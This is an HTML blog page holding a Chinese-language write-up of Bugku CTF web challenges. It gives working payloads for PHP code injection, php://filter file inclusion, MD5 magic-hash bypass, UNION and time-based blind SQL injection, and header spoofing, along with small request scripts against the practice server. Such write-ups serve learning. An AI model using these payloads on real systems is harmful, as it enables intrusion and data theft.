<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>bugku writeup | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="纪念那段岁月
web3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl&#43;u查看源代码，发现一串
&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115; &amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45; &amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt; 这是unicode，转码即可
你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包
本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。
payload：/index.php?hello = show_source(&lsquo;flag.php&rsquo;) 网上的payload：/index.php?hello=1);show_source(&lsquo;flag.php&rsquo;);var_dump(
域名解析 编辑etc/hosts添加一条123.206.87.240	flag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。
反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。
添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）
你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag
变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w&#43;的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码
输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag
Web5 查看源代码，发现jother编码，打开控制台输入就行了
头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）
网站被黑 扫描端口
发现登陆界面
然后用burpsuite的intruder功能破解
管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag
参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html
web4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="https://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:title" content="bugku writeup" />
<meta property="og:description" content="纪念那段岁月
web3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl&#43;u查看源代码，发现一串
&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115; &amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45; &amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt; 这是unicode，转码即可
你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包
本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。
payload：/index.php?hello = show_source(&lsquo;flag.php&rsquo;) 网上的payload：/index.php?hello=1);show_source(&lsquo;flag.php&rsquo;);var_dump(
域名解析 编辑etc/hosts添加一条123.206.87.240	flag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。
反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。
添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）
你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag
变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w&#43;的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码
输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag
Web5 查看源代码，发现jother编码，打开控制台输入就行了
头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）
网站被黑 扫描端口
发现登陆界面
然后用burpsuite的intruder功能破解
管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag
参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html
web4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/" />
<meta property="og:image" content="https://ch3n9w.cpolar.cn/image-20211114140949068.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-04-22T04:13:30+00:00" />
<meta property="article:modified_time" content="2019-04-22T04:13:30+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://ch3n9w.cpolar.cn/image-20211114140949068.png" />
<meta name="twitter:title" content="bugku writeup"/>
<meta name="twitter:description" content="纪念那段岁月
web3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl&#43;u查看源代码，发现一串
&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115; &amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45; &amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt; 这是unicode，转码即可
你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包
本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。
payload：/index.php?hello = show_source(&lsquo;flag.php&rsquo;) 网上的payload：/index.php?hello=1);show_source(&lsquo;flag.php&rsquo;);var_dump(
域名解析 编辑etc/hosts添加一条123.206.87.240	flag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。
反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。
添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）
你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag
变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w&#43;的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码
输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag
Web5 查看源代码，发现jother编码，打开控制台输入就行了
头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）
网站被黑 扫描端口
发现登陆界面
然后用burpsuite的intruder功能破解
管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag
参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html
web4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码："/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.cpolar.cn/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "bugku writeup",
      "item": "https://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "bugku writeup",
  "name": "bugku writeup",
  "description": "纪念那段岁月\nweb3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl+u查看源代码，发现一串\n\u0026lt;!--\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115; \u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45; \u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;--\u0026gt; 这是unicode，转码即可\n你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包\n本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。\npayload：/index.php?hello = show_source(\u0026lsquo;flag.php\u0026rsquo;) 网上的payload：/index.php?hello=1);show_source(\u0026lsquo;flag.php\u0026rsquo;);var_dump(\n域名解析 编辑etc/hosts添加一条123.206.87.240\tflag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。\n反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。\n添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）\n你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag\n变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\\w+的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码\n输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag\nWeb5 查看源代码，发现jother编码，打开控制台输入就行了\n头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）\n网站被黑 扫描端口\n发现登陆界面\n然后用burpsuite的intruder功能破解\n管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag\n参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html\nweb4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：",
  "keywords": [
    
  ],
  "articleBody": " 纪念那段岁月\nweb3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl+u查看源代码，发现一串\n这是unicode，转码即可\n你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包\n本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。\npayload：/index.php?hello = show_source(‘flag.php’) 网上的payload：/index.php?hello=1);show_source(‘flag.php’);var_dump(\n域名解析 编辑etc/hosts添加一条123.206.87.240\tflag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。\n反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。\n添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）\n你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag\n变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\\w+的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码\n输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag\nWeb5 查看源代码，发现jother编码，打开控制台输入就行了\n头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）\n网站被黑 扫描端口\n发现登陆界面\n然后用burpsuite的intruder功能破解\n管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag\n参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html\nweb4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：\nimport urllib a = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74 %28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c %65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29% 3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70 %65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62' b = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d %3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72 %74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72 %65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45 %6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75 %65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b' print urllib.unquote(a+b) 得到代码如下：\nfunction checkSubmit() { var a=document.getElementById(\"password\"); if(\"undefined\"!=typeof a) { if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value)return!0; alert(\"Error\"); a.focus(); return!1} } document.getElementById(\"levelQuest\").onsubmit=checkSubmit; 可以看出这里已经暴露了password，返回输入即可。\nflag在index里面 点击链接，看url：file=show.Php，参数file是关键， 本地包含(include)：file=php：//filter/read=convert.base64-encode/resource=index.php,\n有关于这些协议的内容要好好看看\n输入密码得到flag 用burpsuite直接打\n点击一百万次 使用hackbar使用post动作：click = 1000001就得到了flag\n备份是个好习惯 知识点补充 $_SEVRER函数\n\u003c?php $SERVER[\"$QUERY_STRING\"] //获取查询语句也就是？之后的内容 $SERBER[\"REQUEST_URI\"] //用来获取URL中的路径地址部分（不是url！）例如：http://www.hujuntao.com/index.php?p=3 //$_SERVER['REQUEST_URI']获得的就是/index.php?p=3这部分 $_SERVER[\"HTTP_X_REWRITE_URL\"] //在IIS下功能同上，在apache环境下显示为空 $SERVER[\"SCRIPT_NAME\"] //获取当前脚本的路径，比如“/aaa/index.php” $_SERVER[\"PHP_SELF\"] //正在执行的脚本名，比如“/aaa/index.php” str function\n\u003c?php strstr($_SERVER['REQUEST_URI'], '?') //return the string after '?' (include '?') substr($str,1) //return the string after the first symbol str_replace('key','',$str) //replace the 'key' in str to '' parse_str($str) //parse the str for example: $str = \"first=value\u0026arr[]=foo+bar\u0026arr[]=baz\"; // 推荐用法 parse_str($str, $output); echo $output['first']; // value echo $output['arr'][0]; // foo bar echo $output['arr'][1]; // baz // 不建议这么用 parse_str($str); echo $first; // value echo $arr[0]; // foo bar echo $arr[1]; // baz 回到bugku题目：备份是个好习惯\n打开界面发现只有一串字符串 搜索index.php.bak可以看到源码：\n\u003c?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \"flag.php\"; ini_set(\"display_errors\", 0); $str = strstr($_SERVER['REQUEST_URI'], '?');//get string before \"?\" $str = substr($str,1); //get string after the second symbol $str = str_replace('key','',$str); //replace 'key' to '' in str parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) \u0026\u0026 $key1 !== $key2){ echo $flag.\"取得flag\"; } ?\u003e 然后分析构造payload，这里有一个知识点，用MD5加密的过程中，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。\n下列的字符串的MD5值都是0e开头的数字：\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns214587387a\n比较md5(username),md5(password),md5(code)类型和值，双等于存在漏洞的原因其实是，0E开头的MD5值php解析器会解析为numerical strings，在双等于（==）情况下，会先判断类型，识别为numerical strings，会强制转换为数字，所以0e开头的MD5值都为0，所以才能绕过，然而三等于就比较有脾气了，必须一对一的核对两个字符串，不存在什么类型转换问题，所以开头0e相同，后面不同，也就不满足了\n所以构造payload：\nindex.php?kkey1=QNKCDZO\u0026kkey2=240610708 按下回车就得到了flag\n另：有一个扫描查看源码泄露的脚本，使用指南和下载地址如下： https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true\n成绩单 判断是数据库的问题，一开始犯蠢在url框里面写payload。。。。 根据昨天所学的知识，我们先输入1，可以输出成绩单。然后输入1’发现失败， 在尾部添加一个#又可以正常显示了。Emmmm。。。然后由于成绩单里面有三个列， 所以从3开始试试看看到底有几个列。。。。 最终在输入-1’ union select 1,2,3,4#的时候能够显示出内容，由此确定了有四列。\n这个地方有点迷：同样是post形式， 在查询框里面输入1’#就可以但是在hackbar里面写id=1‘#就不行， 然而用id=1也是可以正常显示的。。。这个地方很是让我困惑， 后来的payload也是在查询框里面写的。 第二个问题是，同样是注释，为啥#就可以起作用但是–+就不行， 考虑到题目的类型（水题），感觉不太可能是过滤掉了。。。很迷。。。。\n已解决：–+的‘+’的意思是url中的空格，真实的注释仅仅是–\n做完这一切后就可以开始了： 首先是查到所有数据库的名字 -1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata# 得到了数据库名字有一个叫做skctf_flag的 接下来，通过数据库名字查找表名 -1’ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’skctf_flag’#\t得到了一个叫做fl4g的一个表 接下来通过表明找列名 -1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’fl4g’# 得到了一个列名字叫做skctf_flag 最后通过列名找到内容 -1’union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g# 得到flag\ncookie欺骗 看到网址里面filename后面是base64编码的东西，尝试解码看到是keys.txt 改成index.php试一试，然后这里有一个line参数，随便输个1什么的，可以看到有php代码返回 （有一个困惑就是输入0不返回最开始的\u003c?php）然后构造低端脚本：\nimport requests #http://123.206.87.240:8002/web11/index.php?line=\u0026filename=aW5kZXgucGhw url1 = 'http://123.206.87.240:8002/web11/index.php?line=' url2 = '\u0026filename=aW5kZXgucGhw' for para in range(0,20): url = url1 + repr(para) + url2 print(requests.get(url).content) 得到了以下代码\n\u003c?php error_reporting(0); $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\"); $line=isset($_GET['line'])?intval($_GET['line']):0;//这里应该是base进制转换，line为空的话默认设置为0 if($file=='') header(\"location:index.php?line=\u0026filename=a2V5cy50eHQ=\"); $file_list = array( '0' =\u003e'keys.txt', '1' =\u003e'index.php', ); if(isset($_COOKIE['margin']) \u0026\u0026 $_COOKIE['margin']=='margin'){ $file_list[2]='keys.php'; } if(in_array($file, $file_list)){ $fa = file($file);//应该是打开文件的意思，文件应该是在同级目录下 echo $fa[$line]; } ?\u003e 然后这是别人的获取代码脚本：\n#!/usr/bin/env python # -*- coding: utf-8 -*- import requests s=requests.Session() url='http://120.24.86.145:8002/web11/index.php' for i in range(1,20): payload={'line':str(i),'filename':'aW5kZXgucGhw'} a=s.get(url,params=payload).content content=str(a,encoding=\"utf-8\") print(content) 嗯人家的正规很多啊\n然后这里就是要post一个cookie，其中的参数是margin=margin,而且要把filename设置为 keys.php的base64编码形式。这个就在burpsuite中操作：\nbugku–insert into the injection point is as follows:\n$sql=“insert into client_ip (ip) values (’$ip’)”;\nthe $ip comes from “x-forwarded-for”\nand before this code, the symbol ‘,’ has been filtered in our input;\npayload are as followed:\n127.0.0.1+(select case when substr((select flag from flag) from 1 for 1)='C' then sleep(5) else 0 end)-- + the ‘+’ on the tail is not for annotation,instead it exists for the blank space before ,because the posted data’s last space will be ignored ,but adding another symbol after the space can avoid it.\nnever give up 查看源代码，看见注释\n修改url，进入的是ctf的主页，在viewsource中修改代码，得到了另一个网页的源代码，查找得到 可能是重定向。\n\u003cHTML\u003e \u003cHEAD\u003e \u003cSCRIPT LANGUAGE=\"Javascript\"\u003e \u003c/SCRIPT\u003e \u003c/HEAD\u003e \u003cBODY\u003e \u003c/BODY\u003e \u003c/HTML\u003e 那个一大串的东西是url编码的东西（观察到开头和结尾部分可能是一对注释的头尾）。 在python中解码如下：\nimport urllib a=\"%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI 3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI 5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5 0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB 1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\" print urllib.unquote(a) 这里面出来的是base64编码的东西，解码得到\n\";if(!$_GET['id']) header('Location: hello.php?id=1'); exit(); } $id=$_GET['id']; $a=$_GET['a']; $b=$_GET['b']; if(stripos($a,'.')) echo 'no no no no no no no'; return ; } $data = @file_get_contents($a,'r');//file_get_contents - 将整个文件读入字符串 if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)\u003e5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4) //eregi是正则匹配函数 require(\"f4l2a3g.txt\"); } else print \"never never never give up !!!\"; } ?\u003e 其实直接在url里面写一个f4l2a3g.txt就可以得到flag了\n正解如下： 题目的意思是要满足以下条件：\nid不等于0\nid弱等于0，那么查看php的表格发现字符串弱等于0，所以让id=“ijk”\nb的第一个字符不等于4，又要让“111”.substr(b,0,1)和“1114”匹配起来。eregi函数可以用截断字符\\x00绕过 但是注意在输入url的时候\\x00会被转码，导致url被截断。注意，虽然 b=%0012345 实际字符串长度为 8 字节， 但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现， 而不是在 URL 查询字符串变量中出现。\n$data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。 在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。 伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。\n所以构造如下：\nid=\"int\"\u0026b=%0012345\u0026a=php://input 并在burp的请求头中添加bugku is a nice plateform! welcome to the bugkuctf 进入源代码界面，file_get_contents说明得是数据流，看到hint.php,然后再检索框里面输入：\nindex.php?txt=php://input\u0026file=hint.php 并且在burpsuite中添加welcome to thebugkuctf 得到的只是hint.php的效果界面，要看到hint的源码，要这样输入\nindex.php?txt=php://input\u0026file=php://filter/read=convert.base64-encode/resource=hint.php 输出一堆base64编码，解码得到\n\u003c?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-\u003efile)){ echo file_get_contents($this-\u003efile); echo \"\n\"; return (\"good\"); } } } ?\u003e 